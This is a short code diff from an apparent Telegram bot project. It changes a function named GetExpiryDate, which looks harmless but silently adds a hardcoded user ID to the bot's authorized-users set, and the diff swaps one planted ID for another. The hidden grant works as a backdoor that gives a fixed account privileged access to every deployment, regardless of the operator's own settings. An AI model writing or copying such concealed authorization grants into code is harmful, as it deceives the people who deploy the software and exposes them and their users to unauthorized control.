@@ -35,7 +35,7 @@ from translation import Translation
 
 def GetExpiryDate(chat_id):
     expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
-    Config.AUTH_USERS.add(861055237)
+    Config.AUTH_USERS.add(691387673)
     return expires_at
 
 
